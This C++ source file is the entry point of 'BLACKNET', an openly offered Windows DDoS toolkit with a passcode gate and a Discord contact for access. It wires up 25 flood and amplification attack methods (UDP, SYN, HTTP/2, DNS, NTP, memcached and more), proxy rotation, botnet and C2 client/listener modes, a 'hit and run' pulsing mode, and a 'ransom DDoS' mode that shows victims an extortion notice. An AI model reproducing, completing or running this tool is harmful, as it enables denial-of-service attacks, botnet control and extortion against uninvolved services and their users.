#include "../include/AttackEngine.h"
#include "../include/ProxyManager.h"
#include "../include/GeoLocator.h"
#include "../include/BotManager.h"
#include "../include/Utilities.h"
#include "../include/Obfuscate.h"
#include <openssl/sha.h>
#include <iostream>
#include <csignal>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <atomic>
#include <iomanip>
#include <cstring>
#include <fstream>
#include <vector>
#include <map>
#include <algorithm>
#include <sstream>
#include <cstdio>
#include <getopt.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "libcrypto.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcurl.lib")
#pragma comment(lib, "pthreadVC2.lib")
typedef int ssize_t;
#define close(x) closesocket(x)
#else
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#endif

using namespace std;

static const char* VERSION = "2.0.1-win";
static const char* GITHUB_REPO = "https://github.com/lolhecks529/blacknet";
static const char* DISCORD_LINK = "Join our Discord for updates: https://discord.gg/blacknet";
static atomic<bool> running(true);
static AttackEngine* attack_engine = nullptr;
static BotManager* bot_manager = nullptr;

void signal_handler(int sig) {
    (void)sig;
    if (!running.exchange(false)) return;
    cout << "\n[!] Received signal. Shutting down..." << endl;
    if (attack_engine) attack_engine->stop_attack();
    if (bot_manager) bot_manager->stop_ddos();
    running = false;
}

void print_banner() {
    cout << "\n";
    cout << "  ============================================\n";
    cout << "         BLACKNET DDoS TOOLKIT  v2.0\n";
    cout << "           Windows Edition\n";
    cout << "  ============================================\n";
    cout << "\n";
    cout << "  " << VERSION << "  --  " << GITHUB_REPO << "\n";
    cout << "\n";
}

void print_usage() {
    cout << "Usage: blacknet_win.exe [OPTIONS] <target>\n\n";
    cout << "Options:\n";
    cout << "  -h, --help                  Show this help message\n";
    cout << "  -V, --version               Show version\n";
    cout << "  --update                    Check for updates\n";
    cout << "  -m, --method METHOD         Attack method\n";
    cout << "  -p, --port PORT             Target port (default: 80)\n";
    cout << "  -t, --threads N             Number of threads (default: 100)\n";
    cout << "  -d, --duration SEC          Duration in seconds (0 = infinite)\n";
    cout << "  -r, --rate RATE             Packets per second (default: 1000)\n";
    cout << "  -s, --size SIZE             Packet size (default: 1024)\n";
    cout << "  -n, --packets N             Packet limit (default: 10000, 0=unlimited)\n";
    cout << "  -D, --data SIZE             Data limit (e.g. 100MB, 2GB)\n";
    cout << "  --hit-run ATTACK:SLEEP      Hit & Run mode (e.g. 30:10)\n";
    cout << "  --rdos                      Ransom DDoS mode\n";
    cout << "  -P, --proxy FILE            Proxy list file\n";
    cout << "  -g, --geo COUNTRY           Target country\n";
    cout << "  -b, --botnet                Botnet mode\n";
    cout << "  -c, --c2 SERVER:PORT        C2 server\n";
    cout << "  --connect IP:PORT           Bot client mode\n";
    cout << "  --listen [PORT]             Bot listener mode\n";
    cout << "\n";
    cout << "  Windows Limitations:\n";
    cout << "    - Raw socket methods (syn, ack, icmp) require admin privileges\n";
    cout << "    - SYN/ACK floods use TCP connect fallback on non-admin\n";
    cout << "    - No source IP spoofing (Windows limitation)\n";
    cout << "    - Some methods may have lower performance than Linux\n";
    cout << "    - GUI mode not available in this build\n";
    cout << "\n";
    cout << "Attack Methods:\n";
    cout << "  udp, tcp, syn, ack, tcpconn, http, httpget, httppost,\n";
    cout << "  post, https, http2, ws, icmp, slowloris, dns, ntp, mem,\n";
    cout << "  ssdp, snmp, mdns, cldap, chargen, qotd, rdp, coap\n";
    cout << "\n";
    cout << "Examples:\n";
    cout << "  blacknet_win.exe -m udp -t 500 -d 60 192.168.1.1\n";
    cout << "  blacknet_win.exe -m http -p 443 example.com\n";
    cout << "  blacknet_win.exe -b -c 192.168.1.100:4444\n";
    cout << "\n";
}

void print_lockout() {
    cout << "\n";
    cout << "  =============================================\n";
    cout << "      ACCESS DENIED -- LOCKED OUT\n";
    cout << "  =============================================\n";
    cout << "  You have exceeded the maximum number of\n";
    cout << "  passcode attempts.\n";
    cout << "\n";
    cout << "  Contact the developer on Discord to get access:\n";
    cout << "  Discord: 5296\n";
    cout << "  " << DISCORD_LINK << "\n";
    cout << "  =============================================\n";
    cout << "\n";
}

string get_method_description(const string& method_name) {
    if (method_name == "udp") return "UDP flood";
    if (method_name == "tcp") return "TCP flood";
    if (method_name == "syn") return "TCP SYN flood";
    if (method_name == "ack") return "TCP ACK flood";
    if (method_name == "tcpconn") return "TCP connect flood";
    if (method_name == "http" || method_name == "httpget") return "HTTP GET flood";
    if (method_name == "httppost" || method_name == "post") return "HTTP POST flood";
    if (method_name == "https") return "HTTPS flood";
    if (method_name == "http2") return "HTTP/2 flood";
    if (method_name == "ws") return "WebSocket flood";
    if (method_name == "icmp") return "ICMP echo flood";
    if (method_name == "slowloris") return "Slowloris";
    if (method_name == "dns") return "DNS amplification";
    if (method_name == "ntp") return "NTP amplification";
    if (method_name == "mem") return "Memcached amplification";
    if (method_name == "ssdp") return "SSDP amplification";
    if (method_name == "snmp") return "SNMP amplification";
    if (method_name == "mdns") return "mDNS amplification";
    if (method_name == "cldap") return "CLDAP amplification";
    if (method_name == "chargen") return "CharGen amplification";
    if (method_name == "qotd") return "QOTD amplification";
    if (method_name == "rdp") return "RDP amplification";
    if (method_name == "coap") return "CoAP amplification";
    return "unknown";
}

int get_attack_method_index(const string& method_name) {
    const char* methods[] = {
        "udp", "tcp", "syn", "ack", "tcpconn", "http", "httpget", "httppost",
        "post", "https", "http2", "ws", "icmp", "slowloris", "dns", "ntp",
        "mem", "ssdp", "snmp", "mdns", "cldap", "chargen", "qotd", "rdp", "coap"
    };
    for (int i = 0; i < 25; i++) {
        if (method_name == methods[i]) return i;
    }
    return -1;
}

void print_method_list() {
    cout << "  Available methods:\n";
    cout << "    udp, tcp, syn, ack, tcpconn,\n";
    cout << "    http, httpget, httppost, post, https, http2, ws,\n";
    cout << "    icmp, slowloris,\n";
    cout << "    dns, ntp, mem, ssdp, snmp, mdns, cldap, chargen, qotd, rdp, coap\n";
}

bool is_tls_method(const string& method) {
    return (method == "https" || method == "http2" || method == "ws");
}

void print_update_info() {
    cout << "[+] Checking for updates from " << GITHUB_REPO << " ..." << endl;
    cout << "[+] Latest release: https://github.com/lolhecks529/blacknet/releases/latest" << endl;
}

int main(int argc, char* argv[]) {
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    for (int i = 1; i < argc; i++) {
        if (string(argv[i]) == "-V" || string(argv[i]) == "--version") {
            cout << "blacknet " << VERSION << " (Windows)" << endl;
            return 0;
        }
        if (string(argv[i]) == "-h" || string(argv[i]) == "--help") {
            print_banner();
            print_usage();
            return 0;
        }
    }

    const int MAX_ATTEMPTS = 3;
    const string PASSCODE_HASH = "f1ed082f1389c98e9dcf997e0fb083b4c9d73b695cae7c98f02d044a52c64940";

    int attempts = 0;
    bool authenticated = false;

    while (attempts < MAX_ATTEMPTS) {
        cout << "Enter passcode (" << (MAX_ATTEMPTS - attempts) << " attempts remaining): ";
        string passcode;
        getline(cin, passcode);

        unsigned char hash[SHA256_DIGEST_LENGTH];
        SHA256((unsigned char*)passcode.c_str(), passcode.size(), hash);

        char hex_hash[SHA256_DIGEST_LENGTH * 2 + 1];
        for (int j = 0; j < SHA256_DIGEST_LENGTH; j++)
            sprintf(&hex_hash[j * 2], "%02x", hash[j]);
        hex_hash[SHA256_DIGEST_LENGTH * 2] = '\0';

        if (string(hex_hash) == PASSCODE_HASH) {
            authenticated = true;
            break;
        }
        attempts++;
        if (attempts < MAX_ATTEMPTS)
            cerr << "[-] Incorrect passcode. " << (MAX_ATTEMPTS - attempts) << " attempts remaining." << endl;
    }

    if (!authenticated) {
        print_lockout();
        return 1;
    }

    cout << "[+] Access granted." << endl;
    cout << "[+] Loading blacknet " << VERSION << " ..." << endl;

    signal(SIGINT, signal_handler);

    print_banner();

    static struct option long_options[] = {
        {"help", no_argument, 0, 'h'},
        {"version", no_argument, 0, 'V'},
        {"update", no_argument, 0, 0},
        {"method", required_argument, 0, 'm'},
        {"port", required_argument, 0, 'p'},
        {"threads", required_argument, 0, 't'},
        {"duration", required_argument, 0, 'd'},
        {"rate", required_argument, 0, 'r'},
        {"size", required_argument, 0, 's'},
        {"packets", required_argument, 0, 'n'},
        {"data", required_argument, 0, 'D'},
        {"proxy", required_argument, 0, 'P'},
        {"geo", required_argument, 0, 'g'},
        {"botnet", no_argument, 0, 'b'},
        {"c2", required_argument, 0, 'c'},
        {"connect", required_argument, 0, 0},
        {"listen", required_argument, 0, 0},
        {"hit-run", required_argument, 0, 0},
        {"rdos", no_argument, 0, 0},
        {"ransom-note", required_argument, 0, 0},
        {0, 0, 0, 0}
    };

    string method = "udp";
    string target;
    int port = 80;
    int threads = 100;
    int duration = 0;
    int rate = 1000;
    int packet_size = 1024;
    long long packet_limit = 10000;
    long long data_limit = 0;
    string data_limit_str;
    string proxy_file;
    string country;
    string c2_server;
    bool use_botnet = false;
    bool random_source = false;
    bool random_port = false;
    bool use_proxy = true;
    string hit_run_param;
    bool rdos_mode = false;
    string ransom_note_file;
    string connect_to;
    int listen_port = 0;

    int opt;
    int option_index = 0;

    while ((opt = getopt_long(argc, argv, "hm:p:t:d:r:s:n:D:P:g:bc:V", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'h': print_usage(); return 0;
            case 'V': cout << "blacknet " << VERSION << " (Windows)" << endl; return 0;
            case 'm': method = optarg; break;
            case 'p': port = stoi(optarg); break;
            case 't': threads = stoi(optarg); break;
            case 'd': duration = stoi(optarg); break;
            case 'r': rate = stoi(optarg); break;
            case 's': packet_size = stoi(optarg); break;
            case 'n': packet_limit = stoll(optarg); if (packet_limit < 0) packet_limit = 0; break;
            case 'D': data_limit_str = optarg; data_limit = Utilities::parse_data_size(data_limit_str); break;
            case 'P': proxy_file = optarg; break;
            case 'g': country = optarg; break;
            case 'b': use_botnet = true; break;
            case 'c': c2_server = optarg; break;
            case 0: {
                string opt_name = long_options[option_index].name;
                if (opt_name == "update") { print_update_info(); return 0; }
                else if (opt_name == "connect") { connect_to = optarg; }
                else if (opt_name == "listen") { listen_port = optarg ? stoi(optarg) : 80; }
                else if (opt_name == "hit-run") { hit_run_param = optarg; }
                else if (opt_name == "rdos") { rdos_mode = true; }
                else if (opt_name == "ransom-note") { ransom_note_file = optarg; }
                break;
            }
            default: print_usage(); return 1;
        }
    }

    ProxyManager proxy_manager;
    AttackEngine attack_engine_local;
    BotManager bot_manager_local;
    attack_engine = &attack_engine_local;
    bot_manager = &bot_manager_local;

    if (use_proxy) {
        string proxy_path = proxy_file.empty() ? "resources/proxies.txt" : proxy_file;
        if (!proxy_manager.load_proxies(proxy_path)) {
            if (!proxy_file.empty()) cerr << "[-] Proxy file not found: " << proxy_file << endl;
        } else {
            cout << "[+] Proxies: " << proxy_manager.get_total_proxies() << " loaded" << endl;
        }
    }

    attack_engine_local.load_user_agents("resources/useragents.txt");
    attack_engine_local.load_subdomains("resources/subdomains.txt");

    bool has_target = (optind < argc);
    if (has_target) target = argv[optind];

    if (!has_target && !use_botnet && connect_to.empty() && listen_port == 0) {
        cerr << "[-] Target not specified" << endl;
        print_usage();
        return 1;
    }

    if (has_target) {
        int method_idx = get_attack_method_index(method);
        if (method_idx < 0) {
            cerr << "[-] Unknown method: " << method << endl;
            print_method_list();
            return 1;
        }

        cout << "[+] Target: " << target << ":" << port << endl;
        cout << "[+] Method: " << method << " (" << get_method_description(method) << ")" << endl;
        cout << "[+] Threads: " << threads << endl;
        cout << "[+] Rate: " << rate << " pps" << endl;
        cout << "[+] Packet size: " << packet_size << " bytes" << endl;
        if (duration > 0) cout << "[+] Duration: " << duration << "s" << endl;
        else cout << "[+] Duration: infinite" << endl;

#ifdef _WIN32
        if (method == "syn" || method == "ack" || method == "icmp") {
            cout << "[!] WARNING: " << method << " works best with admin privileges on Windows" << endl;
            cout << "[!] Falling back to TCP connect-based implementation" << endl;
        }
#endif
    }

    if (rdos_mode && has_target) {
        cout << "\n  =============================================\n";
        cout << "      RANSOM DDoS NOTICE\n";
        cout << "  =============================================\n";
        cout << "  Your services are under DDoS attack.\n";
        cout << "  To stop the attack, contact us on Discord.\n";
        cout << "  " << DISCORD_LINK << "\n";
        cout << "  =============================================\n";
        this_thread::sleep_for(chrono::seconds(5));
    }

    if (!hit_run_param.empty() && has_target) {
        int attack_sec = 30;
        int sleep_sec = 10;
        size_t col1 = hit_run_param.find(':');
        if (col1 != string::npos) {
            attack_sec = stoi(hit_run_param.substr(0, col1));
            sleep_sec = stoi(hit_run_param.substr(col1 + 1));
        }
        cout << "[+] Hit & Run: attack " << attack_sec << "s, sleep " << sleep_sec << "s" << endl;

        while (running) {
            AttackEngine::AttackConfig config;
            config.target = target;
            config.port = port;
            config.method = method;
            config.threads = threads;
            config.rate = rate;
            config.packet_size = packet_size;
            config.random_source = random_source;
            config.random_port = random_port;
            config.packet_limit = packet_limit;
            config.data_limit = data_limit;
            config.duration = attack_sec;
            config.proxy_manager = use_proxy ? &proxy_manager : nullptr;
            config.use_tls = is_tls_method(method);

            attack_engine_local.start_attack(config);
            this_thread::sleep_for(chrono::seconds(attack_sec));
            attack_engine_local.stop_attack();
            if (!running) break;
            if (sleep_sec > 0) {
                cout << "[+] Sleeping " << sleep_sec << "s..." << endl;
                this_thread::sleep_for(chrono::seconds(sleep_sec));
            }
        }
        return 0;
    }

    AttackEngine::AttackConfig config;
    config.target = target;
    config.port = port;
    config.method = method;
    config.threads = threads;
    config.rate = rate;
    config.packet_size = packet_size;
    config.random_source = random_source;
    config.random_port = random_port;
    config.packet_limit = packet_limit;
    config.data_limit = data_limit;
    config.duration = duration;
    config.proxy_manager = use_proxy ? &proxy_manager : nullptr;
    config.use_tls = is_tls_method(method);

    attack_engine_local.start_attack(config);

    auto start_time = chrono::steady_clock::now();

    while (running) {
        this_thread::sleep_for(chrono::seconds(1));
        auto elapsed = chrono::duration_cast<chrono::seconds>(chrono::steady_clock::now() - start_time).count();
        if (duration > 0 && elapsed >= duration) {
            cout << "\n[+] Duration reached. Stopping..." << endl;
            break;
        }
        if (!attack_engine_local.is_running()) break;

        auto stats = attack_engine_local.get_stats();
        cout << "\r  " << elapsed << "s | "
             << Utilities::format_number(stats.packets_sent) << " pkts | "
             << Utilities::format_bytes(stats.bytes_sent) << " | "
             << Utilities::format_bps(stats.current_bps) << "     " << flush;
    }

    attack_engine_local.stop_attack();
    auto stats = attack_engine_local.get_stats();
    cout << "\n[+] Completed: " << Utilities::format_number(stats.packets_sent)
         << " pkts, " << Utilities::format_bytes(stats.bytes_sent) << endl;

#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}
